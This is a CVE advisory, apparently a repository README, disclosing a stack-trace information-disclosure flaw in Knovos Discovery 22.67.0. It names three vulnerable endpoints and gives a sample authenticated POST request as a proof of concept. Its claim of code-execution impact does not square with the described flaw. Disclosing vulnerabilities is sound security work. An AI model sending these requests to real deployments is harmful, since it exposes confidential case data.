# CVE-2023-47459

## Description

A vulnerability was discovered in Knovos Discovery v.22.67.0 that allows a remote attacker to access confidential information using the components: <br> /DiscoveryReview/Service/CaseManagement.svc/GetProductSiteName, /DiscoveryReview/Service/WorkProduct.svc/BindRelatedDocumentsInformation and /DiscoveryProcess/Service/Admin.svc/getReviewIdForReport.

## Vulnerability Type

Stack trace / Information Disclosure

## Vendor of Product

Knovos Discovery

## Affected Product Code Base

Version 22.67.0 - Version 22.67.0

## Affected Component

/DiscoveryReview/Service/CaseManagement.svc/GetProductSiteName
/DiscoveryReview/Service/WorkProduct.svc/BindRelatedDocumentsInformation
/DiscoveryProcess/Service/Admin.svc/getReviewIdForReport

## Attack Type

Remote

## Impact Code execution

true

## Impact Information Disclosure

true

## Discoverer

- Aleksey Vistorobskiy

## Attack Vectors

authorized user

```
POST /DiscoveryReview/Service/WorkProduct.svc/BindRelatedDocumentsInformation HTTP/1.1
Host: vuln_host
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 17
Connection: close

{
	"Id": id
}

```

## Reference

- https://www.knovos.com/
- https://github.com/aleksey-vi/CVE-2023-47459
